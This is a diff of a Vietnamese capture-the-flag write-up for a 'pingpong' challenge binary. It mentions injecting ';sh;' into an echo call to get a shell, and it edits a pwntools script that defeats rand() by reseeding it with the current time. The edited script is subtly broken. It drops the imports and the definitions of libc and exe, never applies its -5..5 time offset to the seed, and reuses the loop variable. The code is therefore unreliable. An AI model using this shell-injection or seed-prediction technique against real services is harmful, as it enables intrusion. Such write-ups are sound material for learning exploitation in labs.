@@ -23,22 +23,17 @@ Thay vào đó dùng chuỗi `";sh;"`. Chuỗi này sẽ ngắt echo và tạo s
 ## Bypass rand()
 Đầu tiên để tái tạo lại kết quả của `rand()` thì cần tạo biết seed ban đầu là gì. Chương trình dùng `time(0)` tức lấy thời gian hiện tại làm seed. Nếu như script dùng `time(0)` cùng lúc với chương trình thì sẽ tái tạo được seed. 
 
-    #!/usr/bin/env python3
-    from pwn import *
-    from ctypes import CDLL
-    libc =CDLL("libc.so.6")
-    context.binary=exe=ELF('./pingpong_patched',checksec=False)
-    while(1):            //brute force thì có thể lệch thời gian với server
-    	p=process(exe.path)
+        for i in range (-5,5):           //brute force thì có thể lệch thời gian với server
+    	    p=process(exe.path)
     
-    	p.recvuntil('my game?')
-    	seed=libc.time(0)
-    	libc.srand(seed)
+    	    p.recvuntil('my game?')
+    	    seed=libc.time(0)
+    	    libc.srand(seed)
     
-    	for i in range(20):
-    		payload=libc.rand()%2
-    		if payload==0:
-    			p.sendlineafter(b'right',b'l')
-    		else:
-    			p.sendlineafter(b'right',b'r')
+    	    for i in range(20):
+    		    payload=libc.rand()%2
+    		    if payload==0:
+    			    p.sendlineafter(b'right',b'l')
+    		    else:
+    			    p.sendlineafter(b'right',b'r')
 
